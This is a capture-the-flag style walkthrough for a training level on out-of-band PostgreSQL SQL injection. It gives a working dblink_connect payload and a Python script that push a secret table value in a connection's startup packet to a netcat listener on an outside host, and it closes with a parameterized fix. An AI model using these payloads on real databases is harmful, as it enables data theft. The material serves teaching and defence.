# Level 3-1: Out-of-Band SQLi via dblink

**URL:** `/oob`

**Objective:** Exfiltrate the flag from the `oob_relatorio_secreto` table by forcing the database to open an outbound TCP connection to an attacker-controlled netcat listener, with the flag smuggled in the PostgreSQL startup packet's username field. The data never appears in the HTTP response.

## Vulnerable Code

```python
cur.execute("SET statement_timeout = '500ms'")
query = f"SELECT nome, alcunha FROM olheiros WHERE id = {scout_id}"
cur.execute(query)
cur.fetchall()
```

The `id` parameter is injected directly into a numeric context with no quotes and no parameterization.

The endpoint deliberately narrows the attack surface to OOB only:
- The response is always a static hardcoded record — UNION-based injection yields nothing
- Exceptions are swallowed silently — error-based extraction is blind
- The response is identical regardless of the WHERE result — boolean blind is useless
- `statement_timeout = '500ms'` kills time-based blind (`pg_sleep`) before it can produce a measurable delay

## How the OOB Technique Works

The developer enabled the PostgreSQL `dblink_connect(connstr)` extension function that opens a TCP connection to another PostgreSQL server. Before any authentication exchange, the initiating server sends a startup packet to the target. This packet includes the `user` field in cleartext.

By constructing the connection string so that the `user` value is the result of a subquery, the extracted data travels inside the startup packet to an attacker-controlled listener, bypassing all in-band query response channels entirely. The connection attempt itself fails (no PostgreSQL is listening), but the startup packet arrives before that failure.

## Attack Chain

### Step 1 — Start a listener on your machine

```bash
nc -lvnp 9000
```

The PostgreSQL server (inside Docker) will connect to `host.docker.internal:9000`, which resolves to your host machine via the `extra_hosts: host-gateway` mapping in `compose.yml`. In a real attack, this would be a public IP or domain name controlled by the attacker.

### Step 2 — Inject the dblink_connect payload

Observation: Here we already know the target but you could discover it via enumeration (e.g., `information_schema.tables`) like in previous levels.

```
1 AND dblink_connect('host=host.docker.internal port=9000 dbname=postgres user=' || (SELECT segredo FROM oob_relatorio_secreto LIMIT 1) || ' password=x sslmode=disable') IS NOT NULL
```

The injected SQL becomes:

```sql
SELECT nome, alcunha FROM olheiros WHERE id = 1 AND dblink_connect('host=host.docker.internal port=9000 dbname=postgres user=' || (SELECT segredo FROM oob_relatorio_secreto LIMIT 1) || ' password=x sslmode=disable') IS NOT NULL
```

A single statement. PostgreSQL evaluates `dblink_connect(...)` as part of the WHERE clause and calls it with the connection string:

```
host=host.docker.internal port=9000 dbname=postgres user=JUMENTOS{dblink_0ut_0f_b4nd} password=x sslmode=disable
```

`sslmode=disable` is required. Without it, PostgreSQL tries SSL handshake and since nc does not speak PostgreSQL, no reply comes and the connection aborts before the data we want is ever sent.

With `sslmode=disable`, PostgreSQL skips SSL negotiation and sends the startup packet immediately. `dblink_connect` raises an error because no PostgreSQL server answers, but it's too late, the flag is already sent in the startup packet.

### Step 3 — Read the flag from the netcat output

The startup packet arrives in plaintext. Look for the username field in the binary data:

```
...JUMENTOS{dblink_0ut_0f_b4nd}...
```

The congrats banner appears on the page when `dblink_connect` is detected in the input.

### Example automation script

File available at: `backend/scripts/script-3_1.py`

```python
import requests

LISTENER_PORT = 9000
BASE = 'http://localhost/api/oob'

payload = f"1; SELECT dblink_connect('host=host.docker.internal port={LISTENER_PORT} dbname=postgres user=' || (SELECT segredo FROM oob_relatorio_secreto LIMIT 1) || ' password=x sslmode=disable')"
r = requests.get(BASE, params={'id': payload})
print(f"HTTP {r.status_code} — check your netcat listener for the flag in the startup packet")
print(r.text)
```

## Fixed Code

```python
query = "SELECT nome, alcunha FROM olheiros WHERE id = %s"
cur.execute(query, (scout_id,))
```

Parameterized queries prevent injection entirely. Additionally, don't allow the database to make outbound connections based on user input. If you need to fetch external data, do it from the application layer where you have more control and visibility.
